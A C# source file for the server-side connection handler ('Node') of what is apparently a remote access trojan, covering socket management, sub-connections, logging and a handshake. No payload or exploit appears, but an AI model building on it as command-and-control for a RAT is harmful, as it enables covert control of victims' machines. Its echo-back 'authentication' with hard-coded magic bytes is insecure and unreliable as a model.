using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace test_rat_server
{
    public partial class Node
    {
        private static string logFile = "logs/nodes.log";

        private void LogNode(string message, string type = "*")
        {
            try
            {
                Directory.CreateDirectory("logs");
                string logMessage = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [{type}] [Node {ID}] {message}";
                File.AppendAllText(logFile, logMessage + Environment.NewLine);
            }
            catch { }
        }

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int memcmp(byte[] b1, byte[] b2, long count);

        private SemaphoreSlim OneRecieveAtATime = new SemaphoreSlim(1);
        public bool isDisposed = false;
        private Action<Node> HandleServiceStop;
        private List<Action<Node>> TempHandleServiceStops = new List<Action<Node>>();
        public List<Node> serviceConnections;
        private Dictionary<int, Node> subNodeWait;
        public NetworkManager sock;
        public Node Parent;
        public int ID = -1;
        public int SubNodeIdCount = 0;
        public int connectionType = 0;//0 = main, 1 = heartbeat, 2 = anything else

        public Node(NetworkManager _sock, Action<Node> _HandleServiceStop)
        {
            sock = _sock;
            serviceConnections = new List<Node>();
            subNodeWait = new Dictionary<int, Node>();
            HandleServiceStop = _HandleServiceStop;
            LogNode("Node instance created", "+");
        }

        private byte[] GetByteArray(int size)
        {
            Random rnd = new Random();
            byte[] b = new byte[size];
            rnd.NextBytes(b);
            return b;
        }

        public void SetID(int id)
        {
            ID = id;
            LogNode($"ID set to {id}", "*");
        }

        private bool ByteArrayCompare(byte[] b1, byte[] b2)
        {
            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }

        private async Task<int> GetSocketType()
        {
            byte[] type = await sock.ReceiveAsync();
            if (type == null)
            {
                LogNode("Failed to get socket type", "-");
                Disconnect();
                return -1;
            }
            int IntType = sock.BytesToInt(type);
            LogNode($"Socket type received: {IntType}", "*");
            return IntType;
        }

        public async void Disconnect()
        {
            LogNode($"Disconnecting from {GetIp()}", "-");
            isDisposed = true;

            try
            {
                if (sock.sock != null)
                {
                    await Task.Factory.FromAsync(sock.sock.BeginDisconnect, sock.sock.EndDisconnect, true, null);
                    LogNode("Socket disconnected gracefully", "*");
                }
            }
            catch
            {
                sock.sock?.Close(0);
                LogNode("Socket closed forcefully", "-");
            }

            sock.sock?.Dispose();
            OneRecieveAtATime.Dispose();

            if (connectionType == 0)
            {
                foreach (Node i in serviceConnections.ToList())
                {
                    try
                    {
                        if (i.connectionType != 1)
                        {
                            i?.Disconnect();
                        }
                    }
                    catch { }
                }
            }

            if (HandleServiceStop != null)
            {
                HandleServiceStop(this);
            }

            List<Action<Node>> copy = TempHandleServiceStops.ToList();
            TempHandleServiceStops.Clear();
            foreach (Action<Node> tempdisconnect in copy)
            {
                tempdisconnect(this);
            }
            copy.Clear();
            serviceConnections.Remove(this);
            LogNode("Node cleanup complete", "*");
        }

        public void SetRecvTimeout(int ms)
        {
            sock.SetRecvTimeout(ms);
        }

        public void ResetRecvTimeout()
        {
            sock.ResetRecvTimeout();
        }

        public bool Connected()
        {
            try
            {
                return sock.sock.Connected;
            }
            catch
            {
                return false;
            }
        }

        public async Task<byte[]> ReceiveAsync()
        {
            if (isDisposed)
            {
                return null;
            }

            await OneRecieveAtATime.WaitAsync();
            try
            {
                byte[] data = await sock.ReceiveAsync();
                if (data == null)
                {
                    LogNode("Receive failed - null data", "-");
                    Disconnect();
                    return null;
                }
                //LogNode($"Received {data.Length} bytes", "*");
                return data;
            }
            finally
            {
                OneRecieveAtATime.Release();
            }
        }

        public async Task<bool> SendAsync(byte[] data)
        {
            if (!(await sock.SendAsync(data)))
            {
                LogNode("Send failed", "-");
                Disconnect();
                return false;
            }
            //LogNode($"Sent {data.Length} bytes", "*");
            return true;
        }

        public string GetIp()
        {
            string ip = "N/A";
            try
            {
                ip = ((IPEndPoint)sock.sock.RemoteEndPoint).Address.ToString();
            }
            catch { }
            return ip;
        }

        public async Task<Node> CreateSubNodeAsync(int Type)
        {
            LogNode($"Creating subnode type {Type}", "*");
            if (Type < 1 || Type > 2)
            {
                LogNode($"Invalid subnode type: {Type}", "-");
                throw new Exception("ID too high or low. must be a 1 or 2.");
            }

            Random rnd = new Random();
            int retid = rnd.Next(1, 256);
            while (subNodeWait.ContainsKey(retid))
            {
                retid = rnd.Next(1, 256);
            }

            subNodeWait[retid] = null;
            byte[] CreateSubReq = new byte[] { 0, (byte)Type, (byte)retid };
            await SendAsync(CreateSubReq);

            byte[] worked = await ReceiveAsync();
            if (worked == null || worked[0] == 0)
            {
                LogNode($"Subnode creation failed", "-");
                subNodeWait.Remove(retid);
                return null;
            }

            int count = 0;
            while (subNodeWait[retid] == null && Connected() && count < 10)
            {
                await Task.Delay(1000);
                count++;
                LogNode($"Waiting for subnode... Attempt {count}/10", "*");
            }

            Node subNode = subNodeWait[retid];
            subNodeWait.Remove(retid);

            if (subNode != null)
            {
                LogNode($"Subnode created successfully", "+");
            }
            else
            {
                LogNode($"Subnode creation timed out", "-");
            }

            return subNode;
        }

        public void AddTempHandleServiceStop(Action<Node> function)
        {
            TempHandleServiceStops.Add(function);
        }

        public void RemoveTempHandleServiceStop(Action<Node> function)
        {
            TempHandleServiceStops.Remove(function);
        }

        public async Task AddSubNode(Node subnode)
        {
            LogNode($"Adding subnode of type {subnode.connectionType}", "*");
            if (subnode.connectionType != 0)
            {
                byte[] retid = await subnode.ReceiveAsync();
                if (retid == null)
                {
                    LogNode("Failed to receive subnode ID", "-");
                    subnode.Disconnect();
                }
                subNodeWait[retid[0]] = subnode;
                LogNode($"Subnode added with ID {retid[0]}", "+");
            }
            else
            {
                LogNode("Invalid subnode type", "-");
                subnode.Disconnect();
            }
            serviceConnections.Add(subnode);
        }

        public async Task<bool> AuthenticateAsync(int id)
        {
            LogNode($"Starting authentication for ID {id}", "*");
            try
            {
                byte[] randomKey = GetByteArray(100);
                byte[] data;

                if (!(await sock.SendAsync(randomKey)))
                {
                    LogNode("Failed to send random key", "-");
                    return false;
                }

                sock.SetRecvTimeout(10000);
                data = await sock.ReceiveAsync();

                if (data == null)
                {
                    LogNode("No response received", "-");
                    return false;
                }

                if (ByteArrayCompare(randomKey, data))
                {
                    LogNode("Key validation successful", "+");
                    if (!(await sock.SendAsync(new byte[] { 123, 45, 67, 89, 12, 34, 56, 78, 90, 23, 45, 67, 89, 101, 112, 131 })))
                    {
                        return false;
                    }

                    int type = await GetSocketType();
                    if (type > 2 || type < 0)
                    {
                        LogNode($"Invalid socket type: {type}", "-");
                        return false;
                    }

                    if (type == 0)
                    {
                        byte[] sockId = sock.IntToBytes(id);
                        ID = id;
                        if (!(await sock.SendAsync(sockId)))
                        {
                            return false;
                        }
                        LogNode($"Main connection authenticated", "+");
                    }
                    else
                    {
                        data = await sock.ReceiveAsync();
                        if (data == null)
                        {
                            LogNode("Failed to receive service ID", "-");
                            Disconnect();
                            return false;
                        }
                        int sockId = sock.BytesToInt(data);
                        ID = sockId;
                        LogNode($"Service connection authenticated", "+");
                    }

                    connectionType = type;
                    sock.ResetRecvTimeout();
                    return true;
                }
                LogNode("Key validation failed", "-");
            }
            catch (Exception ex)
            {
                LogNode($"Authentication error: {ex.Message}", "-");
            }
            return false;
        }
    }
}
